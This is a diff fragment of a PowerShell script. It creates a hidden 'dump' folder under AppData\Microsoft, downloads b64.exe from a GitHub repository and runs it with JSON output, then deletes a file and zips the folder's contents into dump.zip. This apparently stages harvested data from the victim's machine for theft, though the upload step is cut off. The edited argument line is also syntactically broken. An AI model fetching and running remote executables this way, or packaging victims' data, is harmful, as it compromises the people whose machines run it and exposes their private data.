@@ -5,7 +5,8 @@ mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
 #Downloading and executing b64.exe
 Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b64.exe'
-& .\b64.exe --format json
+$Parms = --format json
+& ".\b64.exe" $Parms
 Remove-Item -Path "$env:appdata\Microsoft\dump\64.exe" -Force
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
